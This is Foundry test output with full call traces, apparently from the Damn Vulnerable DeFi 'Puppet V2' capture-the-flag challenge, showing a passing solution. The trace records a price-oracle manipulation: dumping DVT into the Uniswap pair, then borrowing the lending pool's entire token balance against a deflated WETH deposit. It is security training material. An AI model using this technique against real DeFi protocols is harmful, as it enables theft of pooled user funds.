forge test --match-path PuppetV2.t.sol -vvvv 
[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.8.25
[⠢] Solc 0.8.25 finished in 1.00s
Compiler run successful!

Ran 2 tests for test/puppet-v2/PuppetV2.t.sol:PuppetV2Challenge
[PASS] test_assertInitialState() (gas: 50329)
Traces:
  [50329] PuppetV2Challenge::test_assertInitialState()
    ├─ [0] VM::assertEq(20000000000000000000 [2e19], 20000000000000000000 [2e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [2516] DamnValuableToken::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 10000000000000000000000 [1e22]
    ├─ [0] VM::assertEq(10000000000000000000000 [1e22], 10000000000000000000000 [1e22]) [staticcall]
    │   └─ ← [Return]
    ├─ [2516] DamnValuableToken::balanceOf(PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24]) [staticcall]
    │   └─ ← [Return]
    ├─ [2480] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::balanceOf(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]) [staticcall]
    │   └─ ← [Return] 31622776601683792319 [3.162e19]
    ├─ [0] VM::assertGt(31622776601683792319 [3.162e19], 0) [staticcall]
    │   └─ ← [Return]
    ├─ [11418] PuppetV2Pool::calculateDepositOfWETHRequired(1000000000000000000 [1e18]) [staticcall]
    │   ├─ [2504] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::getReserves() [staticcall]
    │   │   └─ ← [Return] 10000000000000000000 [1e19], 100000000000000000000 [1e20], 1
    │   └─ ← [Return] 300000000000000000 [3e17]
    ├─ [0] VM::assertEq(300000000000000000 [3e17], 300000000000000000 [3e17]) [staticcall]
    │   └─ ← [Return]
    ├─ [3418] PuppetV2Pool::calculateDepositOfWETHRequired(1000000000000000000000000 [1e24]) [staticcall]
    │   ├─ [504] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::getReserves() [staticcall]
    │   │   └─ ← [Return] 10000000000000000000 [1e19], 100000000000000000000 [1e20], 1
    │   └─ ← [Return] 300000000000000000000000 [3e23]
    ├─ [0] VM::assertEq(300000000000000000000000 [3e23], 300000000000000000000000 [3e23]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

[PASS] test_puppetV2() (gas: 264120)
Traces:
  [316320] PuppetV2Challenge::test_puppetV2()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [24520] DamnValuableToken::approve(0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], spender: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [2516] DamnValuableToken::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 10000000000000000000000 [1e22]
    ├─ [101681] 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50::swapExactTokensForETH(10000000000000000000000 [1e22], 9000000000000000000 [9e18], [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b, 0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], 1)
    │   ├─ [2504] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::getReserves() [staticcall]
    │   │   └─ ← [Return] 10000000000000000000 [1e19], 100000000000000000000 [1e20], 1
    │   ├─ [10985] DamnValuableToken::transferFrom(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, 10000000000000000000000 [1e22])
    │   │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, amount: 10000000000000000000000 [1e22])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [54120] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::swap(9900695134061569016 [9.9e18], 0, 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 0x)
    │   │   ├─ [29658] WETH::transfer(0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, 9900695134061569016 [9.9e18])
    │   │   │   ├─ emit Transfer(from: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, to: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, amount: 9900695134061569016 [9.9e18])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [539] WETH::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]
    │   │   │   └─ ← [Return] 99304865938430984 [9.93e16]
    │   │   ├─ [516] DamnValuableToken::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]
    │   │   │   └─ ← [Return] 10100000000000000000000 [1.01e22]
    │   │   ├─ emit Sync(reserve0: 99304865938430984 [9.93e16], reserve1: 10100000000000000000000 [1.01e22])
    │   │   ├─ emit Swap(sender: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, amount0In: 0, amount1In: 10000000000000000000000 [1e22], amount0Out: 9900695134061569016 [9.9e18], amount1Out: 0, to: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50)
    │   │   └─ ← [Stop]
    │   ├─ [15977] WETH::withdraw(9900695134061569016 [9.9e18])
    │   │   ├─ emit Transfer(from: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, to: 0x0000000000000000000000000000000000000000, amount: 9900695134061569016 [9.9e18])
    │   │   ├─ emit Withdrawal(to: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50, amount: 9900695134061569016 [9.9e18])
    │   │   ├─ [83] 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50::fallback{value: 9900695134061569016}()
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [0] player::fallback{value: 9900695134061569016}()
    │   │   └─ ← [Stop]
    │   └─ ← [Return] [10000000000000000000000 [1e22], 9900695134061569016 [9.9e18]]
    ├─ [25968] WETH::deposit{value: 29900695134061569016}()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], amount: 29900695134061569016 [2.99e19])
    │   ├─ emit Deposit(who: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], amount: 29900695134061569016 [2.99e19])
    │   └─ ← [Stop]
    ├─ [2516] DamnValuableToken::balanceOf(PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [9418] PuppetV2Pool::calculateDepositOfWETHRequired(1000000000000000000000000 [1e24]) [staticcall]
    │   ├─ [504] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::getReserves() [staticcall]
    │   │   └─ ← [Return] 99304865938430984 [9.93e16], 10100000000000000000000 [1.01e22], 1
    │   └─ ← [Return] 29496494833197321980 [2.949e19]
    ├─ [24543] WETH::approve(PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], 29496494833197321980 [2.949e19])
    │   ├─ emit Approval(owner: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], spender: PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], amount: 29496494833197321980 [2.949e19])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [60141] PuppetV2Pool::borrow(1000000000000000000000000 [1e24])
    │   ├─ [504] 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190::getReserves() [staticcall]
    │   │   └─ ← [Return] 99304865938430984 [9.93e16], 10100000000000000000000 [1.01e22], 1
    │   ├─ [25608] WETH::transferFrom(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], 29496494833197321980 [2.949e19])
    │   │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], amount: 29496494833197321980 [2.949e19])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [5770] DamnValuableToken::transfer(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], 1000000000000000000000000 [1e24])
    │   │   ├─ emit Transfer(from: PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc], to: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], amount: 1000000000000000000000000 [1e24])
    │   │   └─ ← [Return] true
    │   ├─ emit Borrowed(borrower: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], depositRequired: 29496494833197321980 [2.949e19], borrowAmount: 1000000000000000000000000 [1e24], timestamp: 1)
    │   └─ ← [Stop]
    ├─ [24870] DamnValuableToken::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 1000000000000000000000000 [1e24])
    │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 1000000000000000000000000 [1e24])
    │   └─ ← [Return] true
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [516] DamnValuableToken::balanceOf(PuppetV2Pool: [0x9101223D33eEaeA94045BB2920F00BA0F7A475Bc]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Lending pool still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [516] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] VM::assertEq(1000000000000000000000000 [1e24], 1000000000000000000000000 [1e24], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 3.94ms (1.18ms CPU time)

Ran 1 test suite in 9.79ms (3.94ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
